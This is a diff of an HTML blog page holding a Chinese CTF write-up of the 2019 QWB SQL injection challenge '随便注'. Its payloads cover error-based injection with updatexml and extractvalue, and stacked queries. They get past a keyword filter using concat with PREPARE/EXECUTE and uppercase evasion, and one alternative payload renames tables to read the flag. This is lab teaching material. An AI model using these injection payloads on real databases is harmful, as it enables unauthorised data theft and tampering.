@@ -61,35 +61,55 @@
   <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路"><span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他的一些做法"><span class="toc-text">其他的一些做法</span></a></li></ol>
 
   <div class="post-content">
-    <p>19年强网杯的一道题目<br>题目环境：<a href="https://buuoj.cn/challenges#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">https://buuoj.cn/challenges#%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>题目名字叫随便注，显然是sql注入</p>
+    <p>19年强网杯的一道题目<br>
+题目环境：<a href="https://buuoj.cn/challenges#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">https://buuoj.cn/challenges#随便注</a></p>
+<h2 id="解题思路">解题思路</h2>
+<p>题目名字叫随便注，显然是sql注入</p>
 <ul>
-<li>首先确定注入的类型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
-得到报错<blockquote>
-<p>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1</p>
-</blockquote>
-</li>
+<li>首先确定注入的类型</li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+<p>得到报错</p>
+<blockquote>
+<p>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’’ at line 1</p>
+</blockquote>
 <p>可以确定是字符型的注入</p>
 <ul>
-<li>尝试利用报错注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1' and updatexml(1,concat(0x7e,database(),0x7e),1) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-返回<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
-可以看到过滤了select,update,delete,drop,insert,where和.<br>利用别的报错注入可以得到库名为supersqli<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1' and extractvalue(1, concat(0x5c, database(),0x5c)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-但接下来无论是union select还是报错注入都没办去获取表名，因为select被过滤了，也没有找到什么办法绕过</li>
-<li>发现堆叠注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-发现可以堆叠注入，得到表名1919810931114514和words<br>把被过滤的关键字拆分开，用concat拼接，然后用PREPARED和EXECUTE执行<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">use</span> information_schema;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">prepare</span> stmt1 <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-返回<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, <span class="string">"set"</span>) &amp;&amp; strstr($inject, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>
-大写没有过滤，把set或者prepare改成大写即可绕过<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">use</span> information_schema;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-得到列名hahahah和flag<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect flag from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-拿到flag<br>注意当表名以数字开头时要用反引号括起来，所以要用`1919810931114514`</li>
+<li>尝试利用报错注入</li>
 </ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1' and updatexml(1,concat(0x7e,database(),0x7e),1) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>返回</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
+<p>可以看到过滤了select,update,delete,drop,insert,where和.<br>
+利用别的报错注入可以得到库名为supersqli</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1' and extractvalue(1, concat(0x5c, database(),0x5c)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>但接下来无论是union select还是报错注入都没办去获取表名，因为select被过滤了，也没有找到什么办法绕过</p>
+<ul>
+<li>发现堆叠注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>发现可以堆叠注入，得到表名1919810931114514和words<br>
+把被过滤的关键字拆分开，用concat拼接，然后用PREPARED和EXECUTE执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">use</span> information_schema;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">prepare</span> stmt1 <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>返回</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, <span class="string">"set"</span>) &amp;&amp; strstr($inject, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>
+<p>大写没有过滤，把set或者prepare改成大写即可绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">use</span> information_schema;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>得到列名hahahah和flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect flag from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>拿到flag<br>
+注意当表名以数字开头时要用反引号括起来，所以要用`1919810931114514`</p>
 <p>一道类似的题目是18年SUCTF的MultiSql</p>
-<h2 id="其他的一些做法"><a href="#其他的一些做法" class="headerlink" title="其他的一些做法"></a>其他的一些做法</h2><ul>
-<li>获取列名还可以<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li>
-<li>另一种思路是把words表改成其他名字，把1919810931114514改成words，因为原本的sql语句是从words表中查询，所以只要把flag列改名成id就可以直接查询出flag<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`temp`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words; <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inject=1' or 1=1 <span class="comment">--+</span></span><br><span class="line">查询出表中所有内容</span><br></pre></td></tr></table></figure>
-</li>
+<h2 id="其他的一些做法">其他的一些做法</h2>
+<ul>
+<li>获取列名还可以</li>
 </ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>另一种思路是把words表改成其他名字，把1919810931114514改成words，因为原本的sql语句是从words表中查询，所以只要把flag列改名成id就可以直接查询出flag</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`temp`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words; <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inject=1' or 1=1 <span class="comment">--+</span></span><br><span class="line">查询出表中所有内容</span><br></pre></td></tr></table></figure>
 
   </div>
   <div class="post-meta">
